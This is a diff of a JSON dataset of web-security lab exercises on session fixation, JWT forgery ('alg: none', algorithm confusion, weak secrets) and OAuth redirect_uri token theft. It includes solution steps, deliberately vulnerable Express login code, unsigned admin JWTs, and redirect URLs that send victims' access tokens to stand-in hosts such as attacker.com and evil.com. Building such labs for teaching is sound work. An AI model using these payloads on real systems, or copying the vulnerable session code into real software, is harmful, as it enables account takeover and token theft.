@@ -1,25 +1,24 @@
 [
-    {
-        "Lab scenario": "Session fixation vulnerability in login endpoint",
-        "Lab Description": "The login functionality improperly trusts pre-authentication session tokens. The application fails to issue a new session identifier upon successful login. To solve: fixate a session ID before login and use it to access Carlos’s account.",
-        "Difficulty Level": "Medium",
-        "Solution Steps": [
-          "Use Burp Suite to capture the GET /login request before any login attempt.",
-          "Observe that a session cookie (e.g., sessionId) is already issued before login.",
-          "Send the login request for Carlos using valid credentials via Burp Repeater with the fixed sessionId still active.",
-          "After successful login, reuse the same sessionId and send a GET request to /account.",
-          "Verify successful account access via the authenticated session with the fixed session ID."
-        ],
-        "Vulnerability name": "Authentication",
-        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { res.cookie('sessionId', 'static-session-id'); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { if (req.cookies.sessionId === 'static-session-id') res.send('Carlos account page'); else res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
-        "payloads": [
-          "Pre-assign sessionId=static-session-id before login",
-          "Send POST /login with credentials and fixed sessionId",
-          "Reuse fixed sessionId to access /account"
-        ]
-      }
-,
-{
+  {
+    "Lab scenario": "Session fixation vulnerability in login endpoint",
+    "Lab Description": "The login functionality improperly trusts pre-authentication session tokens. The application fails to issue a new session identifier upon successful login. To solve: fixate a session ID before login and use it to access Carlos’s account.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Use Burp Suite to capture the GET /login request before any login attempt.",
+      "Observe that a session cookie (e.g., sessionId) is already issued before login.",
+      "Send the login request for Carlos using valid credentials via Burp Repeater with the fixed sessionId still active.",
+      "After successful login, reuse the same sessionId and send a GET request to /account.",
+      "Verify successful account access via the authenticated session with the fixed session ID."
+    ],
+    "Vulnerability name": "Authentication",
+    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { res.cookie('sessionId', 'static-session-id'); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { if (req.cookies.sessionId === 'static-session-id') res.send('Carlos account page'); else res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
+    "payloads": [
+      "Pre-assign sessionId=static-session-id before login",
+      "Send POST /login with credentials and fixed sessionId",
+      "Reuse fixed sessionId to access /account"
+    ]
+  },
+  {
     "Lab scenario": "JWT tampering vulnerability in token verification endpoint",
     "Lab Description": "The application uses JSON Web Tokens (JWT) for authentication but fails to validate the algorithm field securely. The server accepts tokens with the algorithm set to 'none', leading to authentication bypass. To solve: forge a valid JWT that grants admin access without a signature.",
     "Difficulty Level": "Hard",
@@ -37,9 +36,8 @@
       "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
       "JWT: base64url(header) + '.' + base64url(payload) + '.'"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "OAuth misconfiguration in implicit grant flow",
     "Lab Description": "The OAuth implementation uses the implicit flow with weak redirect URI validation, enabling token theft via open redirection. The application trusts redirect URIs from user input. To solve: craft a malicious redirect to steal Carlos’s access token.",
     "Difficulty Level": "Hard",
@@ -57,9 +55,8 @@
       "Captured token from redirect: #access_token=carlos-token",
       "GET /userinfo with Authorization: Bearer carlos-token"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT token signature verification bypass in login endpoint",
     "Lab Description": "The application's JWT authentication mechanism incorrectly trusts the 'alg' header provided by the client. The server uses a public key but does not enforce the expected algorithm. The application signs JWT tokens using RS256, but accepts tokens where the algorithm is changed to HS256. To solve: Craft a JWT with the alg header set to HS256 and sign it using the public key as the HMAC secret to impersonate Carlos.",
     "Difficulty Level": "Hard",
@@ -116,8 +113,7 @@
       "GraphQL login: { login(username: \"carlos\", password: \"newpass\") }",
       "GraphQL query: { myAccount(token: \"valid-token\") }"
     ]
-  }
-  ,
+  },
   {
     "Lab scenario": "Session Fixation in Login Flow",
     "Lab Description": "This lab's login flow is vulnerable to session fixation due to the reuse of session identifiers before and after authentication. The application issues a session ID on initial visit and fails to regenerate it after successful login. To solve: hijack Carlos's session using a pre-set session ID to access his account page.",
@@ -136,9 +132,8 @@
       "Reuse the session cookie after victim login",
       "Manual simulation of session fixation through social engineering"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT Signature None Algorithm Bypass",
     "Lab Description": "This lab uses JSON Web Tokens for session management. It improperly supports the 'none' algorithm and accepts unsigned tokens. The application uses JWTs stored in a cookie to manage sessions but fails to validate signatures correctly. To solve: craft a token for Carlos using the none algorithm and access his profile.",
     "Difficulty Level": "Hard",
@@ -157,9 +152,8 @@
       "Unsigned token: base64(header).base64(payload).",
       "Set-Cookie: token=<tampered JWT>"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "OAuth2 Redirect URI Manipulation",
     "Lab Description": "This lab integrates OAuth2 for social login but allows arbitrary redirection via open redirect in the redirect_uri parameter. The application does not validate the redirect URI domain properly. To solve: trick the app into redirecting to a malicious endpoint to steal Carlos’s token.",
     "Difficulty Level": "Hard",
@@ -177,9 +171,8 @@
       "Authorization URL with malicious redirect",
       "access_token captured from redirected request"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT algorithm confusion in API authorization",
     "Lab Description": "The API uses JWT tokens for user authorization. However, it trusts the 'alg' header in incoming tokens, enabling algorithm confusion attacks. The application accepts tokens signed with 'none' algorithm, bypassing signature validation. To solve: Forge a token granting admin access and retrieve the admin panel contents.",
     "Difficulty Level": "Hard",
@@ -197,9 +190,8 @@
       "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
       "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0."
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "Session fixation via unrotated session cookie after login",
     "Lab Description": "The web application issues a session cookie to all visitors, including unauthenticated ones. However, it fails to rotate the session cookie upon successful login. This enables a session fixation attack. To solve: Fixate Carlos’s session cookie prior to login and hijack his session after authentication.",
     "Difficulty Level": "Medium",
@@ -217,9 +209,8 @@
       "sid=attackerfixedsessionid in phishing email redirect",
       "Cookie replay: sid=attackerfixedsessionid"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "OAuth misconfiguration with open redirect and auto approval",
     "Lab Description": "The application implements OAuth with a third-party identity provider but fails to validate the 'redirect_uri' parameter and automatically grants access tokens. This misconfiguration enables attackers to steal tokens via malicious redirects. To solve: Craft a malicious URL to capture Carlos’s OAuth token.",
     "Difficulty Level": "Hard",
@@ -238,9 +229,8 @@
       "https://attacker.com/capture#access_token=abc123xyz",
       "Authorization: Bearer abc123xyz"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT algorithm confusion in token validation logic",
     "Lab Description": "The application uses JWTs to maintain session state but fails to validate the token's algorithm correctly. The backend blindly trusts the `alg` field in the token header. The application accepts unsigned tokens when the `alg` is set to `none`. To solve: Forge a valid token to access Carlos's account without knowing his password.",
     "Difficulty Level": "Hard",
@@ -295,8 +285,7 @@
       "GET /api/account HTTP/1.1 with leaked token",
       "https://example.com/oauth/callback#access_token=valid-oauth-token-for-carlos"
     ]
-  }
-  ,
+  },
   {
     "Lab scenario": "JWT algorithm confusion attack in REST login API",
     "Lab Description": "This lab’s login functionality accepts JWTs for authentication but fails to enforce proper algorithm validation. The application trusts tokens signed with 'none' algorithm. To solve: forge a JWT token impersonating the user 'carlos' and access their profile page via /api/profile.",
@@ -352,8 +341,7 @@
       "POST /verify with code=4921xx",
       "POST /verify with code=492138"
     ]
-  }
-  ,
+  },
   {
     "Lab scenario": "JWT none algorithm tampering in API auth header",
     "Lab Description": "The API uses JWT-based authentication for sensitive endpoints but fails to validate the algorithm used. The application decodes and accepts tokens with `alg: none` without proper signature verification. To solve: Forge a valid JWT that grants admin privileges and access the protected /admin/report endpoint.",
@@ -371,9 +359,8 @@
       "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
       "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9."
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "OAuth implicit flow token leak in redirect URI",
     "Lab Description": "The application integrates OAuth2 login using the implicit flow and allows open redirection through the `redirect_uri` parameter. The access token is leaked via URL fragment and reflected in the redirect. To solve: Intercept the OAuth flow and capture Carlos's token using a crafted redirect URI.",
     "Difficulty Level": "Hard",
@@ -390,9 +377,8 @@
       "https://vulnerable-site.com/auth?redirect_uri=https://attacker.com/#access_token=&response_type=token",
       "Authorization: Bearer abc123xyz"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "Session fixation via insecure session ID reuse in cookie",
     "Lab Description": "The application allows users to set their own session ID via a cookie prior to authentication. Upon login, the session ID is not regenerated. An attacker can set a known session value and trick a victim into logging in using it. To solve: Fix a session ID and use it to hijack Carlos's session after he logs in.",
     "Difficulty Level": "Medium",
@@ -410,9 +396,8 @@
       "document.cookie = 'session=attacker123'",
       "POST /login with session=attacker123 then wait for Carlos to login with same session"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT tampering using 'alg: none' in Authorization header",
     "Lab Description": "This lab uses JSON Web Tokens (JWT) for user authentication and authorizes access via Bearer tokens. The backend relies on the JWT's `alg` field to determine signature verification. The application fails to enforce algorithm restrictions, allowing manipulation of the `alg` field to 'none' and bypassing signature verification. To solve: tamper with your JWT to impersonate the admin user and access the admin panel.",
     "Difficulty Level": "Medium",
@@ -430,9 +415,8 @@
       "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
       "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "Session fixation vulnerability in login flow",
     "Lab Description": "This lab's login system is vulnerable to session fixation. Session IDs are accepted via URL parameters and not regenerated upon successful login. The application trusts client-supplied session tokens, enabling an attacker to set a victim's session before login. To solve: set a session token for Carlos, trick him into logging in, then reuse his session to access /my-account.",
     "Difficulty Level": "Hard",
@@ -450,9 +434,8 @@
       "Cookie: session=attack123",
       "GET /my-account with session=attack123"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "OAuth implicit flow misconfiguration with open redirect",
     "Lab Description": "The OAuth implementation in this app uses the implicit grant flow without validating redirect URIs correctly. The app also accepts open redirects. By chaining these issues, an attacker can steal access tokens by injecting a malicious redirect URI. To solve: steal Carlos’s OAuth token and use it to access his profile.",
     "Difficulty Level": "Hard",
@@ -470,9 +453,8 @@
       "#access_token=token123",
       "Authorization: Bearer token123"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT token manipulation vulnerability in session authorization",
     "Lab Description": "This lab uses JSON Web Tokens (JWT) to manage user sessions. However, it incorrectly validates the token signature due to the use of the 'none' algorithm. The application trusts the user-submitted token without verifying its integrity, enabling privilege escalation via token tampering. To solve: Forge a valid token that grants admin-level access and use it to access the admin panel.",
     "Difficulty Level": "Medium",
@@ -490,9 +472,8 @@
       "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
       "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "Session fixation via predictable session ID in cookie management",
     "Lab Description": "This lab uses a session cookie to maintain user authentication states. However, the session ID is set before login and is not regenerated upon successful authentication, allowing an attacker to fix a session for a victim before they log in. To solve: Fix a session for Carlos, make him log in, then reuse the session ID to access his account.",
     "Difficulty Level": "Hard",
@@ -510,9 +491,8 @@
       "Cookie: session=fixedsessionidvalue",
       "Cookie: session=carlosSession001"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "OAuth misconfiguration in third-party login endpoint",
     "Lab Description": "This lab uses OAuth for federated login through a third-party provider. However, the redirect URI is not strictly validated, allowing an attacker to manipulate the redirection flow and gain access to a valid session. To solve: Exploit the redirect_uri parameter to hijack a session token from the OAuth flow and log in as the victim.",
     "Difficulty Level": "Hard",
@@ -530,9 +510,8 @@
       "https://vulnerable.site/auth?redirect_uri=http://localhost:1337/hook",
       "https://vulnerable.site/auth?redirect_uri=https://example.com/oauth/exploit"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "Session fixation attack in login flow",
     "Lab Description": "The session management in this application fails to regenerate session identifiers after login. The application accepts pre-set session cookies from unauthenticated users and continues to use the same session after successful login. To solve: hijack a logged-in session by fixing the session token prior to user authentication.",
     "Difficulty Level": "Medium",
@@ -550,9 +529,8 @@
       "https://target-site.com/login?session=12345",
       "POST /login HTTP/1.1 with Cookie: session=12345"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT signature bypass in authorization header",
     "Lab Description": "The application uses JWTs for user authentication but fails to validate the signing algorithm securely. It accepts tokens signed using the 'none' algorithm without verifying the signature. The application trusts any decoded payload blindly. To solve: craft a forged JWT that impersonates the admin user.",
     "Difficulty Level": "Hard",
@@ -570,9 +548,8 @@
       "Authorization: Bearer [spoofed_token]",
       "{\"alg\":\"none\"} + {\"user\":\"admin\"}"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "OAuth token leakage in redirect URI handler",
     "Lab Description": "This application uses OAuth for authentication, but its redirect URI handler is improperly configured and does not validate the 'state' parameter. An attacker can perform an open redirect and intercept the access token. To solve: steal the OAuth token issued to Carlos and log in as him.",
     "Difficulty Level": "Hard",
@@ -590,9 +567,8 @@
       "https://evil.com/callback#access_token=eyFakeToken123",
       "Authorization: Bearer eyFakeToken123"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT signature spoof via algorithm confusion in login API",
     "Lab Description": "The login endpoint accepts JWTs for authentication. The backend library fails to properly validate the 'alg' field, allowing an attacker to switch from a signed algorithm (e.g. HS256) to 'none'. The application trusts the JWT's payload without verifying its authenticity. To solve: Forge a JWT for user 'carlos' using the 'none' algorithm and access the My account page.",
     "Difficulty Level": "Medium",
@@ -609,9 +585,8 @@
       "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
       "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "Session fixation via predictable session tokens in login redirect",
     "Lab Description": "The application initializes session tokens before login and fails to regenerate them after successful authentication. The token remains fixed across the login flow. To solve: Set a known session ID before login, then force a victim (Carlos) to authenticate, hijack their session, and access the My account page.",
     "Difficulty Level": "Hard",
@@ -629,9 +604,8 @@
       "GET /login HTTP/1.1 with sid=attackersession",
       "GET /my-account HTTP/1.1 with sid=attackersession (after Carlos login)"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "OAuth misconfiguration leaks authorization code via Referer",
     "Lab Description": "The OAuth implementation leaks sensitive tokens through HTTP Referer headers. The app includes a third-party analytics script which causes unintentional leakage. To solve: Intercept the OAuth flow and extract Carlos’s authorization code from the Referer header when redirected to a malicious domain.",
     "Difficulty Level": "Hard",
@@ -650,9 +624,8 @@
       "POST /token with code=stolen-code",
       "Authorization: Bearer <access_token>"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT secret key vulnerability in API authentication",
     "Lab Description": "The application's REST API uses JWTs for user authentication but fails to validate tokens securely. It uses a weak, guessable HMAC secret. The application trusts tokens even when re-signed with an attacker-supplied secret. To solve: Forge a valid admin JWT and access the admin dashboard.",
     "Difficulty Level": "Medium",
@@ -669,9 +642,8 @@
       "header: { \"alg\": \"HS256\", \"typ\": \"JWT\" }, payload: { \"user\": \"carlos\", \"role\": \"admin\" }, secret: '123456'",
       "Authorization: Bearer <forged_JWT_token_with_admin_role>"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "Session fixation vulnerability in login flow",
     "Lab Description": "The application does not issue a new session ID upon successful login, allowing session fixation attacks. Attackers can pre-set session tokens and force victims to authenticate using them. To solve: Fixate a session for Carlos, then access his My account page while impersonating him.",
     "Difficulty Level": "Hard",
@@ -689,9 +661,8 @@
       "Session fixation via phishing: http://victim.site/login with pre-set sessionID",
       "Reuse sessionID after victim login to access /my-account"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "OAuth redirect manipulation in third-party login",
     "Lab Description": "The application uses OAuth for third-party authentication but fails to validate redirect URIs properly. This allows attackers to manipulate the flow and steal authorization codes. To solve: Hijack the OAuth code and log in as Carlos by exchanging the stolen token.",
     "Difficulty Level": "Hard",
@@ -709,9 +680,8 @@
       "POST https://oauth.example.com/token with intercepted code and attacker redirect_uri",
       "Access-token: Bearer <token-for-carlos>"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT signature spoof via algorithm confusion",
     "Lab Description": "The application's authentication mechanism uses JWTs for session management. The backend accepts JWTs with the 'alg' header set to 'none', allowing attackers to forge tokens without a signature. The application trusts the contents of the JWT without verifying its signature when 'none' is used. To solve: Forge a JWT to impersonate Carlos and access his account page.",
     "Difficulty Level": "Medium",
@@ -767,8 +737,7 @@
       "POST to token endpoint with stolen code",
       "access_token=token-for-carlos"
     ]
-  }
-  ,
+  },
   {
     "Lab scenario": "Session fixation via predictable session ID",
     "Lab Description": "The session management system issues session IDs before user authentication, but fails to rotate them upon successful login. This opens the door to session fixation attacks. The application allows setting the session cookie manually and does not regenerate a new session ID post-login. To solve: fixate a session for Carlos before he logs in, then hijack it to access his account.",
@@ -787,9 +756,8 @@
       "Login as Carlos in another tab using fixedid123",
       "Reuse fixedid123 to access /account as Carlos"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT token algorithm manipulation",
     "Lab Description": "This lab uses JWTs for user sessions but fails to properly validate the signing algorithm. The application uses a 'none' algorithm without enforcing server-side signature verification. To solve: forge a valid JWT with 'alg' set to 'none' and impersonate the admin user to access their account.",
     "Difficulty Level": "Medium",
@@ -808,9 +776,8 @@
       "Base64 encoded payload: eyJ1c2VybmFtZSI6ImFkbWluIn0=",
       "JWT: eyJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIn0=."
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "OAuth misconfiguration with open redirect flow",
     "Lab Description": "This OAuth implementation allows redirection to arbitrary URLs after authentication due to missing state parameter validation. The 'redirect_uri' can be manipulated, enabling token theft via phishing. To solve: craft a malicious OAuth URL to intercept Carlos's token and use it to access his profile.",
     "Difficulty Level": "Hard",
@@ -828,9 +795,8 @@
       "Intercepted access_token from attacker.net/callback",
       "Authorization: Bearer token-for-carlos"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT signature spoof via 'none' algorithm",
     "Lab Description": "This lab implements JSON Web Token (JWT) based authentication using insecure algorithm handling. The server accepts tokens signed using the 'none' algorithm, allowing attackers to forge valid tokens without knowing the secret key. The application verifies the JWT token from the Authorization header and grants access to sensitive resources without verifying the signature when 'alg' is set to 'none'. To solve: Craft a forged JWT for Carlos's account and access his profile page.",
     "Difficulty Level": "Medium",
@@ -885,8 +851,7 @@
       "Cookie: session=carlos",
       "GET /my-account HTTP/1.1"
     ]
-  }
-  ,
+  },
   {
     "Lab scenario": "JWT tampering with none algorithm",
     "Lab Description": "The application uses JSON Web Tokens (JWTs) for session management. However, it accepts tokens signed using the 'none' algorithm without verification. The application decodes the token and grants access based on the embedded user role. To solve: Forge a JWT granting admin privileges and access the /admin panel.",
@@ -905,9 +870,8 @@
       "{\"alg\":\"none\"}.{\"username\":\"admin\",\"role\":\"admin\"}.",
       "Authorization: Bearer <modified_jwt>"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "Session fixation through predictable session ID",
     "Lab Description": "The application sets session identifiers in the URL as query parameters after login. These session IDs are generated using predictable patterns. An attacker can fix a session ID for the victim and hijack the session post-login. To solve: Pre-set Carlos's session ID, trick him into logging in, then reuse the session to access his account.",
     "Difficulty Level": "Hard",
@@ -925,9 +889,8 @@
       "/dashboard?sessionID=abc123",
       "sessionID=predefined_session_id"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "OAuth redirect_uri manipulation",
     "Lab Description": "This lab uses OAuth for login via a third-party provider. However, the application does not properly validate the redirect_uri parameter, allowing attackers to steal authorization codes. To solve: Intercept a login request and modify the redirect_uri to an attacker-controlled server, then extract the authorization code.",
     "Difficulty Level": "Hard",
@@ -945,9 +908,8 @@
       "POST /oauth-callback?code=stolen-code",
       "session=<access_token_from_stolen_code>"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT algorithm confusion in Authorization header",
     "Lab Description": "The application's JWT implementation accepts insecure algorithms during token validation. Specifically, it fails to enforce signature verification when the 'alg' field is modified to 'none'. The application trusts any Authorization: Bearer token that decodes to a valid user structure. To solve: craft a forged JWT token with 'none' algorithm and impersonate the user 'carlos' to access their account page.",
     "Difficulty Level": "Medium",
@@ -965,9 +927,8 @@
       "{\"alg\": \"none\"} + {\"username\": \"carlos\"}",
       "Authorization: Bearer <unsigned_JWT_with_carlos>"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "OAuth redirect URI manipulation in callback handler",
     "Lab Description": "The OAuth implementation improperly validates the redirect_uri parameter in the authentication flow. An attacker can manipulate the redirect to inject a malicious OAuth token or leak the access_token. To solve: manipulate the OAuth redirect to impersonate a victim user (carlos) and access their profile.",
     "Difficulty Level": "Hard",
@@ -985,9 +946,8 @@
       "Captured token: access_token_for_carlos",
       "Authorization: Bearer access_token_for_carlos"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "Session fixation in Set-Cookie header",
     "Lab Description": "The application assigns session identifiers via a predictable scheme before authentication. It does not regenerate the session ID post-login, allowing attackers to fixate a session ID and later hijack the session once the victim logs in. To solve: pre-assign a session ID, get the victim to log in, and then use the same session ID to access their account.",
     "Difficulty Level": "Hard",
@@ -1005,9 +965,8 @@
       "Share link with victim using same session ID",
       "Access account with: Cookie: sid=sess-1712345678901"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "Session fixation via insecure Set-Cookie handling in login endpoint",
     "Lab Description": "The login process fails to invalidate pre-authentication session cookies. The application sets the session ID before the user logs in, and that same session persists after successful authentication. To solve: Hijack Carlos's session by fixing a known session ID before authentication and access his account page.",
     "Difficulty Level": "Medium",
@@ -1024,9 +983,8 @@
       "Use predefined sessionId in victim's cookie before login",
       "Replay sessionId in attacker's browser after victim logs in"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT token tampering with symmetric algorithm substitution",
     "Lab Description": "This application uses JWTs for session management but supports algorithm substitution from RS256 to HS256 using a public key as the secret. To solve: Forge a valid JWT token for Carlos and access his account.",
     "Difficulty Level": "Hard",
@@ -1044,9 +1002,8 @@
       "Payload: {\"username\":\"carlos\"}",
       "Sign with HMAC using server's public key as secret"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "OAuth misconfiguration with open redirect leading to token theft",
     "Lab Description": "The OAuth redirect_uri is not properly validated, enabling redirection to arbitrary domains. The app leaks the OAuth access token in the URL fragment. To solve: Steal Carlos's access token via a crafted phishing link and access his account.",
     "Difficulty Level": "Hard",
@@ -1063,9 +1020,8 @@
       "https://vulnerable-app.com/auth?redirect_uri=https://attacker.com/callback",
       "Use stolen token: Authorization: Bearer token-for-carlos"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT tampering via algorithm confusion in session token",
     "Lab Description": "This lab's JWT-based session handling is vulnerable to algorithm confusion. The server does not enforce strict verification of the signing algorithm. The application blindly trusts the `alg` field in the token. To solve: Forge a JWT token with algorithm `none` and escalate your privileges to admin to access the admin panel.",
     "Difficulty Level": "Medium",
@@ -1118,8 +1074,7 @@
       "https://oauth.example.com/auth?client_id=client123&redirect_uri=https://attacker.com/callback",
       "Authorization: Bearer carlos-token"
     ]
-  }
-  ,
+  },
   {
     "Lab scenario": "Session Fixation via Predictable Session ID",
     "Lab Description": "This lab's session management is vulnerable to session fixation. The server accepts session IDs from unauthenticated users and does not regenerate them upon login. The application stores the session ID in a cookie named sid. To solve: hijack Carlos's session and access his account page using a fixed session ID set before login.",
@@ -1177,8 +1132,7 @@
       "GET /token?code=authcode123",
       "Authorization: Bearer token-carlos"
     ]
-  }
-  ,
+  },
   {
     "Lab scenario": "GraphQL endpoint exposing JWT manipulation vulnerability",
     "Lab Description": "A GraphQL API implements authentication using a stateless JWT stored in the Authorization header. The server does not validate the token signature, allowing attackers to craft arbitrary JWTs to impersonate users. The application accepts unsigned tokens with alg=none and exposes a GraphQL endpoint. To solve: Forge a JWT as carlos and retrieve his user profile.",
@@ -1196,9 +1150,8 @@
       "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
       "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0."
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "Session fixation via predictable session ID in login workflow",
     "Lab Description": "This application assigns session IDs before login using a predictable UUIDv4 generator. After login, the same session ID remains active. The attacker can set their session ID and then trick the victim into using it. When the victim logs in, the attacker gains access to their session. To solve: Hijack Carlos's session and access his account page.",
     "Difficulty Level": "Hard",
@@ -1215,9 +1168,8 @@
       "Cookie: session=123e4567-e89b-12d3-a456-426614174000",
       "Cookie: session=deadbeef-dead-beef-dead-beefdeadbeef"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "OAuth misconfiguration in third-party login integration",
     "Lab Description": "The application integrates with a third-party OAuth provider but does not validate the returned access token properly. Attackers can reuse tokens issued to different clients. The misconfiguration stems from missing audience (aud) validation. To solve: Use a token issued for another app to log in as carlos.",
     "Difficulty Level": "Hard",
@@ -1234,9 +1186,8 @@
       "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYXJsb3MiLCJhdWQiOiJmYWtlLW90aGVyLWFwcCJ9.signature",
       "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MiLCJhdWQiOiJtb2NrLWFwcCJ9."
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT tampering via algorithm confusion in authorization header",
     "Lab Description": "This lab's authorization system uses JWT tokens for user identity and access control. The server validates tokens based on the algorithm specified in the token header without enforcing expected signing algorithms. The application naively accepts tokens signed with the 'none' algorithm. To solve: Craft a JWT token that impersonates the 'admin' user and access the /admin panel.",
     "Difficulty Level": "Medium",
@@ -1254,9 +1205,8 @@
       "{\"alg\":\"none\"}.{ \"username\":\"admin\" }.",
       "Authorization: Bearer <unsigned-admin-token>"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "Session fixation through predictable session token reuse",
     "Lab Description": "The lab's login mechanism assigns session tokens before authentication, but does not regenerate them afterward. The application uses cookies to maintain session state. An attacker can set a session ID before victim login, and it will be reused after successful authentication. To solve: Fixate Carlos's session ID and access his account page.",
     "Difficulty Level": "Hard",
@@ -1274,9 +1224,8 @@
       "POST /login with credentials for Carlos using sid=attacker123",
       "GET /my-account with same sid=attacker123"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "OAuth misconfiguration with token leakage via redirect_uri manipulation",
     "Lab Description": "This lab's third-party OAuth implementation fails to properly validate redirect_uri parameters. The attacker can inject a malicious endpoint to steal access tokens via a crafted URL. The application uses OAuth for logging in users. To solve: Leak Carlos's token and use it to access his profile endpoint.",
     "Difficulty Level": "Hard",
@@ -1294,9 +1243,8 @@
       "GET /api/profile with header Authorization: Bearer abc123token",
       "#access_token=abc123token intercepted from attacker.com logs"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "JWT tampering via none algorithm in authorization header",
     "Lab Description": "The application uses JSON Web Tokens (JWT) for session management, but fails to validate the signature algorithm securely. It accepts tokens with the 'alg' set to 'none' without verifying the signature. The application blindly trusts the decoded payload. To solve: Craft a tampered JWT token impersonating the user 'carlos' and access their account page.",
     "Difficulty Level": "Medium",
@@ -1313,9 +1261,8 @@
       "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
       "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "Session fixation via predictable session tokens",
     "Lab Description": "The application implements session tokens that are not regenerated upon login and are derived from predictable values such as timestamps or usernames. The attacker can fix a session identifier before login. To solve: Create a session for Carlos before he logs in, then access his account once he authenticates.",
     "Difficulty Level": "Hard",
@@ -1332,9 +1279,8 @@
       "Cookie: session=sess-1713100000000",
       "Cookie: session=sess-guest-session"
     ]
-  }
-,
-{
+  },
+  {
     "Lab scenario": "OAuth misconfiguration in redirect URI trust",
     "Lab Description": "This lab simulates a misconfigured OAuth flow where the application does not properly validate the redirect URI, allowing open redirection and token leakage. Attackers can supply their own redirect URI to capture access tokens issued to another user. To solve: Exploit the OAuth flow to steal an access token for user 'carlos' and use it to access their protected resources.",
     "Difficulty Level": "Hard",
@@ -1351,9 +1297,8 @@
